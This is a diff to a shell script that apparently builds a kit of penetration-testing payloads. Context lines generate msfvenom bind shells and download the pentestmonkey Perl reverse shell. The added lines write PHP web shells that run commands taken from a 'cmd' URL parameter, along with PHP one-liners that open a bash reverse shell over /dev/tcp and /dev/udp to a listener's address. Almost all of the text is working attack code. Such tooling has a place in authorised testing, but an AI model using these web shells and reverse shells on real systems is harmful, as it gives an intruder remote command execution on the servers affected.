@@ -22,7 +22,11 @@ msfvenom -p cmd/unix/bind_python LPORT=$port_remote -f raw > shell_bind_unix.py
 msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl
 
 
-echo '<?php system($_GET["cmd"]); ?>' > cmd.php
+echo '<?php system($_GET["cmd"]); ?>' > system.php
+echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
+
+echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
+echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
 
 rm pentestmonkey-perl-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
